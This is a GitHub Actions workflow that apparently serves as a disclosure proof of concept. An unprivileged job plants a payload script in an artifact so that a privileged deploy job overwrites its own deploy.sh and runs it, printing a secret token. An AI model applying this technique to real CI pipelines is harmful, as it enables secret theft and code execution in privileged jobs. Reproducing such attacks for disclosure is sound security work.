name: Artifact slip PoC

# Mirrors cloudflare/nimbus .github/workflows/fork-preview.yml:
#   plant  == the attacker-controlled "Fork preview build" run (fork PR, no secrets)
#   consume == the privileged `workflow_run` deploy job (secrets, environment)

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions: {}

jobs:
  plant:
    name: Attacker build run (unprivileged)
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - name: Craft the payload the deploy job will run
        run: |
          mkdir -p payload
          cat > payload/deploy.sh <<'EOF'
          #!/usr/bin/env bash
          echo "PWNED: attacker code executed in the privileged deploy job"
          echo "CLOUDFLARE_API_TOKEN length=${#FAKE_CF_TOKEN}"
          echo "CLOUDFLARE_API_TOKEN=${FAKE_CF_TOKEN}"
          id
          EOF
          echo '<html>benign</html>' > payload/index.html
          chmod +x payload/deploy.sh
      - name: Install the artifact client internals
        working-directory: .github/actions/plant
        run: npm install @actions/artifact@2.3.2 --no-save --silent
      - uses: ./.github/actions/plant
        with:
          name: fork-www-dist
          pairs: "payload/deploy.sh->scripts/deploy.sh"
          extract-dir: fork-www-dist

  consume:
    name: Privileged deploy (mirrors fork-preview.yml deploy job)
    needs: plant
    runs-on: ubuntu-latest
    environment: cloudflare
    permissions:
      actions: read
      contents: read
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          persist-credentials: false
      - name: Before extraction (trusted main)
        run: cat scripts/deploy.sh
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0 - exact pin from target
        with:
          name: fork-www-dist
          path: ${{ runner.temp }}/fork-www-dist
          run-id: ${{ github.run_id }}
          github-token: ${{ github.token }}
      - name: Stage the fork's files (same as target)
        run: |
          rm -rf apps/www/dist
          mkdir -p apps/www
          cp -R "$RUNNER_TEMP/fork-www-dist" apps/www/dist
          echo "== extraction dir =="; find "$RUNNER_TEMP/fork-www-dist" | head -20
          echo "== workspace changes =="; git status --porcelain
          echo "== deploy script after extraction =="; cat scripts/deploy.sh
      - name: Deploy (mirrors `pnpm exec wrangler preview`)
        run: bash scripts/deploy.sh
        env:
          FAKE_CF_TOKEN: ${{ secrets.FAKE_CF_TOKEN }}
